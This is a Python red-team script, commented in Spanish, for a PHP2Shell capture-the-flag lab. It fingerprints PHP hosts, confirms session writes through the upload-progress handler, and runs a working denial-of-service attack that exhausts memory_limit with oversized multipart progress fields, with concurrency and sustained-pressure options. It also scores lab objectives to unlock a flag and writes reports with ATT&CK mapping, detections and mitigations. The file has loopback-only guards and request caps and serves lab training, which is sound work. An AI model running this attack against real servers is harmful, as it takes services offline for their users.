#!/usr/bin/env python3
"""Driver de red team para el laboratorio PHP2Shell (CVE-2026-109618/619).

Demuestra, por fases, el impacto real y acotado del fallo:

  recon     -> huella del stack y del handler session.upload_progress
  validate  -> confirma que el handler abre/escribe la sesion sin que la
               aplicacion llame a session_start() (session fixation local)
  impact    -> agota memory_limit durante el parseo multipart y observa
               caida/reemplazo del worker FPM + 502 en el frontend
  all       -> ejecuta todo y genera informe JSON + Markdown

Limites de seguridad (deliberados):

  * Solo acepta objetivos loopback (127.0.0.0/8, ::1) salvo --authorized.
  * No contiene heap grooming, estructuras falsas, direcciones de memoria,
    llamadas a system() ni persistencia. No es un exploit de RCE.
  * Cap de peticiones (--max-requests) y de tamano (8 MiB) para no convertir
    el laboratorio en una herramienta de DoS generica.

Uso:
    python3 lab/rt.py recon    --url http://127.0.0.1:8080/
    python3 lab/rt.py validate --url http://127.0.0.1:8080/ --docker-inspect
    python3 lab/rt.py impact   --url http://127.0.0.1:8080/ --repeat 3
    python3 lab/rt.py all      --url http://127.0.0.1:8080/ --docker-inspect
"""
from __future__ import annotations

import argparse
import hashlib
import http.client
import ipaddress
import json
import random
import re
import secrets
import shutil
import socket
import subprocess
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent.parent
REPORTS = Path(__file__).resolve().parent / "reports"
MISSION = Path(__file__).resolve().parent / "mission.json"
FLAG_FILE = REPORTS / "FLAG.txt"
BOUNDARY = "----rtPhp2ShellBoundary"
MAX_BODY = 8 * 1024 * 1024  # igual que post_max_size del laboratorio
LOOPBACK_NAMES = {"localhost", "localhost.localdomain"}


# --------------------------------------------------------------------------- #
# Modelo de objetivo y guardas de alcance
# --------------------------------------------------------------------------- #
@dataclass
class Target:
    url: str
    scheme: str
    host: str
    port: int
    path: str

    @classmethod
    def parse(cls, url: str) -> "Target":
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError(f"URL no soportada: {url!r} (usa http:// o https://)")
        path = u.path or "/"
        if u.query:
            path += "?" + u.query
        return cls(
            url=url,
            scheme=u.scheme,
            host=u.hostname or "127.0.0.1",
            port=u.port or (443 if u.scheme == "https" else 80),
            path=path,
        )

    @property
    def base(self) -> str:
        return f"{self.scheme}://{self.host}:{self.port}"


def is_loopback(host: str) -> bool:
    if host.lower() in LOOPBACK_NAMES:
        return True
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror:
        return False
    for info in infos:
        raw = info[4][0].split("%", 1)[0]
        try:
            if not ipaddress.ip_address(raw).is_loopback:
                return False
        except ValueError:
            return False
    return bool(infos)


def assert_scope(target: Target, authorized: bool) -> None:
    if is_loopback(target.host):
        return
    if not authorized:
        raise SystemExit(
            f"[!] Objetivo no loopback ({target.host}).\n"
            "    Este PoC solo opera contra 127.0.0.0/8 o ::1.\n"
            "    Para un engagement autorizado usa --authorized y conserva la\n"
            "    autorizacion por escrito en el informe."
        )
    print(f"[!] Alcance extendido a {target.host} por --authorized", file=sys.stderr)


# --------------------------------------------------------------------------- #
# HTTP y multipart
# --------------------------------------------------------------------------- #
def _request(
    target: Target,
    method: str,
    path: str,
    body: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 15.0,
) -> dict[str, Any]:
    cls = http.client.HTTPSConnection if target.scheme == "https" else http.client.HTTPConnection
    conn = cls(target.host, target.port, timeout=timeout)
    t0 = time.perf_counter()
    try:
        conn.request(method, path, body=body, headers=headers or {})
        resp = conn.getresponse()
        data = resp.read(4096)
        elapsed = time.perf_counter() - t0
        return {
            "ok": True,
            "status": resp.status,
            "reason": resp.reason,
            "elapsed_s": round(elapsed, 4),
            "headers": {k.lower(): v for k, v in resp.getheaders()},
            "body": data[:512].decode("utf-8", "replace"),
        }
    except Exception as exc:  # reset / corte = senal de interes
        return {
            "ok": False,
            "error": f"{type(exc).__name__}: {exc}",
            "elapsed_s": round(time.perf_counter() - t0, 4),
        }
    finally:
        conn.close()


def _part(headers: str, body: bytes) -> bytes:
    return b"--" + BOUNDARY.encode() + b"\r\n" + headers.encode() + b"\r\n\r\n" + body + b"\r\n"


def text_part(name: str, value: bytes) -> bytes:
    return _part(f'Content-Disposition: form-data; name="{name}"', value)


def file_part(name: str, filename: str, data: bytes = b"xxxxxxxx") -> bytes:
    return _part(
        f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
        f"Content-Type: text/plain",
        data,
    )


def build_body(
    sid: str,
    progress: bytes = b"k",
    size: int = 0,
    parts: int = 0,
    name_len: int = 0,
) -> bytes:
    """Construye el multipart del laboratorio.

    - `progress`: valor de PHP_SESSION_UPLOAD_PROGRESS.
    - `size > 0`: agrega un segundo valor de progreso de `size` bytes (OOM).
    - `parts > 0`: agrega `parts` archivos pequenos.
    - `name_len > 0`: usa nombres de campo/archivo de esa longitud.
    """
    chunks: list[bytes] = [
        text_part("PHPSESSID", sid.encode()),
        text_part("PHP_SESSION_UPLOAD_PROGRESS", progress),
    ]
    if size:
        chunks.append(text_part("PHP_SESSION_UPLOAD_PROGRESS", b"A" * size))
        chunks.append(file_part("u0", "f0.txt"))
    for i in range(parts):
        if name_len:
            name = f"u{i}".ljust(name_len, "B")
            chunks.append(file_part(name, name + ".txt"))
        else:
            chunks.append(file_part(f"u{i}", f"f{i}.txt"))
    chunks.append(b"--" + BOUNDARY.encode() + b"--\r\n")
    return b"".join(chunks)


def post_headers(sid: str, body: bytes, ua: str = "php2shell-rt/1.0") -> dict[str, str]:
    return {
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Content-Length": str(len(body)),
        "Cookie": f"PHPSESSID={sid}",
        "Connection": "close",
        "User-Agent": ua,
    }


# --------------------------------------------------------------------------- #
# Fase 1: reconocimiento
# --------------------------------------------------------------------------- #
def phase_recon(target: Target, timeout: float) -> dict[str, Any]:
    probes: list[dict[str, Any]] = []
    headers_parts: list[str] = []
    for path in ("/", "/index.php", "/no-existe-rt.php"):
        r = _request(target, "GET", path, timeout=timeout)
        probes.append({
            "path": path,
            **{k: r[k] for k in ("ok", "status", "reason", "elapsed_s", "error") if k in r},
            "server": r.get("headers", {}).get("server"),
            "x_powered_by": r.get("headers", {}).get("x-powered-by"),
        })
        if r.get("ok"):
            headers_parts.extend(f"{k}: {v}" for k, v in r.get("headers", {}).items())

    sid = secrets.token_hex(16)
    body = build_body(sid, progress=b"k", parts=1)
    probe = _request(target, "POST", target.path, body=body, headers=post_headers(sid, body), timeout=timeout)

    headers_blob = " ".join(headers_parts)
    version_hint = None
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", headers_blob)
    if m:
        version_hint = m.group(1)

    signals = {
        "php_detected": bool(re.search(r"\bphp\b", headers_blob, re.I)) or "pid=" in (probe.get("body") or ""),
        "upload_progress_probe_ok": probe.get("ok") and probe.get("status") == 200,
        "worker_crash_on_probe": (not probe.get("ok")) or (probe.get("status") or 0) >= 500,
        "version_hint": version_hint,
        "probe_sid": sid,
    }
    return {"phase": "recon", "target": asdict(target), "probes": probes,
            "upload_progress_probe": probe, "signals": signals}


# --------------------------------------------------------------------------- #
# Fase 2: validacion del handler (sin OOM)
# --------------------------------------------------------------------------- #
def inspect_container_session(marker: str, compose_file: str) -> dict[str, Any]:
    if not shutil.which("docker"):
        return {"checked": False, "reason": "docker no disponible"}
    script = (
        "for f in /tmp/sess_*; do "
        f"if grep -aq -- '{marker}' \"$f\"; then "
        'echo "FILE:$f"; head -c 700 "$f"; echo; fi; '
        "done"
    )
    cmd = ["docker", "compose", "-f", compose_file, "exec", "-T", "php", "sh", "-c", script]
    try:
        p = subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, timeout=30)
    except Exception as exc:
        return {"checked": False, "reason": f"{type(exc).__name__}: {exc}"}
    out = (p.stdout or "") + (p.stderr or "")
    return {
        "checked": True,
        "found": "FILE:" in out,
        "raw": out.strip()[:2000],
        "returncode": p.returncode,
    }


def phase_validate(target: Target, timeout: float, docker_inspect: bool, compose_file: str) -> dict[str, Any]:
    marker = "RT" + secrets.token_hex(8)
    sid = secrets.token_hex(16)
    body = build_body(sid, progress=marker.encode(), parts=1)
    r = _request(target, "POST", target.path, body=body, headers=post_headers(sid, body), timeout=timeout)
    session = inspect_container_session(marker, compose_file) if docker_inspect else {"checked": False}
    return {
        "phase": "validate",
        "marker": marker,
        "sid": sid,
        "response": r,
        "session_check": session,
        "conclusion": (
            "handler activo y sesion escrita sin session_start()"
            if session.get("found")
            else "handler respondio; comprobar /tmp/sess_* en el contenedor"
            if r.get("ok")
            else "sin respuesta valida"
        ),
    }


# --------------------------------------------------------------------------- #
# Fase 3: impacto (OOM en request startup -> worker caido)
# --------------------------------------------------------------------------- #
def phase_impact(
    target: Target,
    timeout: float,
    size: int,
    repeat: int,
    concurrency: int,
    delay: float,
    jitter: float,
    sustain: float,
    max_requests: int,
) -> dict[str, Any]:
    size = max(1, min(size, MAX_BODY))
    requests_planned = max(1, repeat)
    if sustain > 0:
        requests_planned = max_requests
    else:
        requests_planned = min(requests_planned, max_requests)

    def one() -> dict[str, Any]:
        if jitter > 0:
            time.sleep(random.uniform(0, jitter))
        sid = secrets.token_hex(16)
        body = build_body(sid, progress=b"k", size=size)
        r = _request(target, "POST", target.path, body=body, headers=post_headers(sid, body), timeout=timeout)
        r["bytes"] = len(body)
        return r

    results: list[dict[str, Any]] = []
    t_start = time.time()

    def budget_left() -> bool:
        if sustain <= 0:
            return len(results) < requests_planned
        return (time.time() - t_start) < sustain and len(results) < max_requests

    if concurrency <= 1:
        while budget_left():
            results.append(one())
            if delay > 0 and budget_left():
                time.sleep(delay)
    else:
        with ThreadPoolExecutor(max_workers=concurrency) as pool:
            while budget_left():
                batch = min(concurrency, requests_planned - len(results)) if sustain <= 0 else concurrency
                futs = [pool.submit(one) for _ in range(batch)]
                for f in as_completed(futs):
                    results.append(f.result())
                if delay > 0 and budget_left():
                    time.sleep(delay)

    elapsed = [r["elapsed_s"] for r in results]
    ok_200 = sum(1 for r in results if r.get("ok") and r.get("status") == 200)
    http_5xx = sum(1 for r in results if r.get("ok") and (r.get("status") or 0) >= 500)
    transport = sum(1 for r in results if not r.get("ok"))
    other = len(results) - ok_200 - http_5xx - transport
    avail = ok_200 / len(results) if results else 0.0

    def pct(p: float) -> float:
        if not elapsed:
            return 0.0
        s = sorted(elapsed)
        idx = min(len(s) - 1, max(0, int(round(p * (len(s) - 1)))))
        return round(s[idx], 4)

    metrics = {
        "requests": len(results),
        "ok_200": ok_200,
        "http_5xx": http_5xx,
        "transport_errors": transport,
        "other": other,
        "availability": round(avail, 3),
        "latency_min_s": min(elapsed) if elapsed else 0.0,
        "latency_p50_s": pct(0.50),
        "latency_p95_s": pct(0.95),
        "latency_max_s": max(elapsed) if elapsed else 0.0,
        "wall_s": round(time.time() - t_start, 2),
        "payload_bytes": size,
    }
    denied = (transport + http_5xx) > 0
    return {
        "phase": "impact",
        "metrics": metrics,
        "samples": results[:12],
        "conclusion": (
            "servicio denegado durante la prueba (worker FPM caido/reemplazado)"
            if denied
            else "sin denegacion observable: revisar memory_limit y logs"
        ),
        "limitations": [
            "Mide disponibilidad y caida de worker; no ejecuta codigo.",
            "La fuga de CVE-2026-109618 y el RCE de CVE-2026-109619 requieren heap grooming y quedan fuera de alcance.",
        ],
    }


# --------------------------------------------------------------------------- #
# Informe
# --------------------------------------------------------------------------- #
def _write_report(report: dict[str, Any]) -> tuple[Path, Path]:
    REPORTS.mkdir(parents=True, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    jpath = REPORTS / f"engagement-{ts}.json"
    mpath = REPORTS / f"engagement-{ts}.md"
    jpath.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

    t = report["target"]
    recon = report.get("recon", {})
    val = report.get("validate", {})
    imp = report.get("impact", {})
    sig = recon.get("signals", {})
    m = imp.get("metrics", {})
    sess = val.get("session_check", {})

    md = f"""# Informe de engagement - PHP2Shell lab

- **Fecha (UTC):** {report["timestamp"]}
- **Objetivo:** `{t["url"]}`
- **Modo de alcance:** {"loopback" if report["loopback"] else "autorizado explicitamente"}
- **Herramienta:** `lab/rt.py` (PoC de mecanismo, no RCE)

## 1. Reconocimiento

| Senal | Valor |
|---|---|
| PHP detectado | {sig.get("php_detected")} |
| Version (hint) | {sig.get("version_hint")} |
| Probe upload_progress OK | {sig.get("upload_progress_probe_ok")} |
| Crash en probe benigno | {sig.get("worker_crash_on_probe")} |

## 2. Validacion del handler

- **Marcador inyectado:** `{val.get("marker")}`
- **SID:** `{val.get("sid")}`
- **Respuesta:** `{val.get("response", {}).get("status")}` en {val.get("response", {}).get("elapsed_s")} s
- **Sesion escrita en /tmp:** {sess.get("found", "no comprobado")}
- **Conclusion:** {val.get("conclusion")}

## 3. Impacto

| Metrica | Valor |
|---|---|
| Peticiones | {m.get("requests")} |
| HTTP 200 | {m.get("ok_200")} |
| HTTP 5xx | {m.get("http_5xx")} |
| Errores de transporte | {m.get("transport_errors")} |
| Disponibilidad | {m.get("availability")} |
| Latencia p50 / p95 / max | {m.get("latency_p50_s")} / {m.get("latency_p95_s")} / {m.get("latency_max_s")} s |
| Payload | {m.get("payload_bytes")} bytes |

**Conclusion:** {imp.get("conclusion")}

## 4. Evidencia de apoyo

```text
{(sess.get("raw") or "sin inspeccion de contenedor")[:1500]}
```

## 5. Mapeo ATT&CK

| Tecnica | ID | Uso en este PoC |
|---|---|---|
| Active Scanning | T1595 | Fingerprint de nginx/PHP y del handler |
| Exploit Public-Facing Application | T1190 | Abuso del parseo multipart antes del script |
| Endpoint Denial of Service | T1499 | Agotamiento de `memory_limit` y caida del worker |
| Indicator Removal | T1070 | Borrado de `sess_*` y parada del stack en cleanup |

## 6. Deteccion recomendada

- `PHP Fatal error: Allowed memory size ... exhausted ... in Unknown on line 0`
- `WARNING: [pool www] child N exited with code 70` + `child M started`
- nginx: `502`, `unexpected FastCGI record`, `upstream prematurely closed`
- Rapidito: muchos `POST` multipart con varios `PHP_SESSION_UPLOAD_PROGRESS`

Reglas listas en `lab/detections/`.

## 7. Mitigacion

1. Actualizar a PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 o superior.
2. `session.upload_progress.enabled=0` mientras no se parchee.
3. Limitar cuerpo, numero de partes, cabeceras y nombres en nginx/WAF.
4. Monitorizar muertes de workers FPM y 502 correlacionados con POST grandes.

## 8. Limites del PoC

{chr(10).join("- " + x for x in imp.get("limitations", []))}

---
_Generado automaticamente por `lab/rt.py`._
"""
    mpath.write_text(md, encoding="utf-8")
    return jpath, mpath


# --------------------------------------------------------------------------- #
# Evaluacion de la mision y flag
# --------------------------------------------------------------------------- #
def _latest(pattern: str) -> Path | None:
    files = sorted(REPORTS.glob(pattern), key=lambda p: p.stat().st_mtime)
    return files[-1] if files else None


def _read_text(path: Path | None) -> str:
    if path is None:
        return ""
    try:
        return path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


def cmd_capture(args: argparse.Namespace) -> int:
    mission = json.loads(Path(args.mission).read_text(encoding="utf-8"))
    report_path = Path(args.report) if args.report else _latest("engagement-*.json")
    if report_path is None or not report_path.is_file():
        print("[!] No hay informe de engagement. Ejecuta primero: lab/rt.py all", file=sys.stderr)
        return 1
    report = json.loads(report_path.read_text(encoding="utf-8"))

    rce_path = Path(args.rce_report) if args.rce_report else _latest("rce-*.json")
    rce = json.loads(rce_path.read_text(encoding="utf-8")) if rce_path and rce_path.is_file() else {}

    fpm_path = Path(args.fpm_log) if args.fpm_log else _latest("*-fpm.log")
    nginx_path = Path(args.nginx_log) if args.nginx_log else _latest("*-nginx.log")
    fpm = _read_text(fpm_path)
    nginx = _read_text(nginx_path)

    sig = report.get("recon", {}).get("signals", {})
    val = report.get("validate", {}).get("session_check", {})
    metrics = report.get("impact", {}).get("metrics", {})
    rce_data = rce.get("rce", {})

    checks = {
        "recon": bool(sig.get("php_detected")) and bool(sig.get("upload_progress_probe_ok"))
                 and not bool(sig.get("worker_crash_on_probe")),
        "validate": bool(val.get("found")),
        "impact": bool(metrics)
                  and (int(metrics.get("http_5xx", 0)) + int(metrics.get("transport_errors", 0))) > 0
                  and float(metrics.get("availability", 1.0)) < 1.0,
        "evidence": (
            "in Unknown on line 0" in fpm
            and ("exited with code 70" in fpm or "SIGSEGV" in fpm)
            and ("502" in nginx or "unexpected FastCGI record" in nginx or "upstream prematurely closed" in nginx)
        ),
        "rce": bool(rce_data.get("flag_ok")),
    }

    rows = []
    score = 0
    for obj in mission["objectives"]:
        ok = checks.get(obj["id"], False)
        if ok:
            score += int(obj["points"])
        rows.append((obj["id"], obj["title"], int(obj["points"]), ok))

    threshold = int(mission.get("threshold", 100))
    captured = score >= threshold
    flag = None
    if captured:
        seed = json.dumps({
            "target": report.get("target", {}).get("url"),
            "timestamp": report.get("timestamp"),
            "marker": report.get("validate", {}).get("marker"),
            "rce_flag": rce_data.get("flag_found"),
        }, sort_keys=True)
        digest = hashlib.sha256(seed.encode()).hexdigest()[:16]
        flag = f"FLAG{{php2shell_{digest}}}"
        REPORTS.mkdir(parents=True, exist_ok=True)
        FLAG_FILE.write_text(flag + "\n", encoding="utf-8")

    REPORTS.mkdir(parents=True, exist_ok=True)
    table = "\n".join(
        f"| {title} (`{oid}`) | {pts} | {'OK' if ok else 'PENDIENTE'} |"
        for oid, title, pts, ok in rows
    )
    scoreboard = f"""# Scoreboard - PHP2Shell red team lab

- **Target CVE:** `{report.get("target", {}).get("url")}`
- **Informe:** `{report_path}`
- **RCE report:** `{rce_path or "no disponible"}`
- **Puntuacion:** **{score}/{threshold}**
- **Flag:** `{flag or "bloqueada"}`

| Objetivo | Puntos | Estado |
|---|---:|---|
{table}

## Detalle

- Recon: `{checks["recon"]}`
- Validate (session write): `{checks["validate"]}`
- Impact (DoS): `{checks["impact"]}`
- Evidence (logs): `{checks["evidence"]}`
- RCE (target vulnerable por diseno): `{checks["rce"]}`

---
_Generado por `lab/rt.py capture`._
"""
    scoreboard_path = REPORTS / "scoreboard.md"
    scoreboard_path.write_text(scoreboard, encoding="utf-8")

    result = {
        "score": score,
        "threshold": threshold,
        "captured": captured,
        "flag": flag,
        "checks": checks,
        "report": str(report_path),
        "rce_report": str(rce_path) if rce_path else None,
        "scoreboard": str(scoreboard_path),
    }

    if args.json:
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print(f"[i] informe : {report_path}")
        for oid, title, pts, ok in rows:
            print(f"    {'[x]' if ok else '[ ]'} {title:<42} {pts:>3} pts")
        print(f"[i] score   : {score}/{threshold}")
        if captured:
            print(f"[+] FLAG    : {flag}")
            print(f"[+] guardada: {FLAG_FILE}")
        else:
            print("[!] Flag bloqueada: completa los objetivos pendientes.")
        print(f"[i] scoreboard: {scoreboard_path}")

    return 0 if captured else 1


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def build_parser() -> argparse.ArgumentParser:
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--url", default="http://127.0.0.1:8080/")
    common.add_argument("--authorized", action="store_true",
                        help="permite objetivos no loopback (solo con autorizacion escrita)")
    common.add_argument("--timeout", type=float, default=15.0)
    common.add_argument("--json", action="store_true", help="imprime JSON en stdout")
    common.add_argument("--docker-inspect", action="store_true",
                        help="comprueba /tmp/sess_* via docker compose exec")
    common.add_argument("--compose-file", default="docker-compose.yml")
    common.add_argument("--size", type=int, default=1024 * 1024,
                        help="bytes del valor de progreso (max 8 MiB)")
    common.add_argument("--repeat", type=int, default=1)
    common.add_argument("--concurrency", type=int, default=1)
    common.add_argument("--delay", type=float, default=0.5)
    common.add_argument("--jitter", type=float, default=0.0)
    common.add_argument("--sustain", type=float, default=0.0,
                        help="segundos de presion sostenida (0 = solo --repeat)")
    common.add_argument("--max-requests", type=int, default=50,
                        help="tope duro de peticiones por ejecucion")

    p = argparse.ArgumentParser(description="PoC de red team para el laboratorio PHP2Shell")
    sub = p.add_subparsers(dest="cmd", required=True, parser_class=argparse.ArgumentParser)
    for name, help_ in (
        ("recon", "huella del stack y del handler"),
        ("validate", "confirma escritura de sesion sin session_start()"),
        ("impact", "provoca OOM y mide denegacion"),
        ("all", "recon + validate + impact + informe"),
    ):
        sub.add_parser(name, parents=[common], help=help_)

    cap = sub.add_parser("capture", help="evalua objetivos y desbloquea la flag")
    cap.add_argument("--report", help="engagement JSON (por defecto el mas reciente)")
    cap.add_argument("--rce-report", help="rce JSON generado por lab/rce.py")
    cap.add_argument("--fpm-log", help="log de PHP-FPM (por defecto el mas reciente)")
    cap.add_argument("--nginx-log", help="log de nginx (por defecto el mas reciente)")
    cap.add_argument("--mission", default=str(MISSION))
    cap.add_argument("--json", action="store_true")
    return p


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if args.cmd == "capture":
        return cmd_capture(args)

    target = Target.parse(args.url)
    assert_scope(target, args.authorized)

    started = datetime.now(timezone.utc).isoformat()
    report: dict[str, Any] = {
        "timestamp": started,
        "target": asdict(target),
        "loopback": is_loopback(target.host),
        "authorized": bool(args.authorized),
        "tool": "lab/rt.py",
    }

    if args.cmd in ("recon", "all"):
        report["recon"] = phase_recon(target, args.timeout)
    if args.cmd in ("validate", "all"):
        report["validate"] = phase_validate(target, args.timeout, args.docker_inspect, args.compose_file)
    if args.cmd in ("impact", "all"):
        report["impact"] = phase_impact(
            target, args.timeout, args.size, max(1, args.repeat),
            max(1, args.concurrency), args.delay, args.jitter,
            args.sustain, max(1, args.max_requests),
        )

    if args.cmd == "all":
        jpath, mpath = _write_report(report)
        report["report_files"] = {"json": str(jpath), "markdown": str(mpath)}

    if args.json:
        print(json.dumps(report, indent=2, ensure_ascii=False))
    else:
        _print_summary(report)
    return 0


def _print_summary(report: dict[str, Any]) -> None:
    print(f"[i] objetivo: {report['target']['url']}  (loopback={report['loopback']})")
    if "recon" in report:
        s = report["recon"]["signals"]
        print(f"[1] recon     : php={s['php_detected']} version={s['version_hint']} "
              f"probe_ok={s['upload_progress_probe_ok']} crash={s['worker_crash_on_probe']}")
    if "validate" in report:
        v = report["validate"]
        print(f"[2] validate  : status={v['response'].get('status')} "
              f"session_file={v['session_check'].get('found', 'n/a')} marker={v['marker']}")
    if "impact" in report:
        m = report["impact"]["metrics"]
        print(f"[3] impact    : {m['requests']} reqs, 200={m['ok_200']} 5xx={m['http_5xx']} "
              f"transport={m['transport_errors']} avail={m['availability']}")
    if "report_files" in report:
        print(f"[4] informe   : {report['report_files']['markdown']}")
        print(f"               {report['report_files']['json']}")


if __name__ == "__main__":
    raise SystemExit(main())
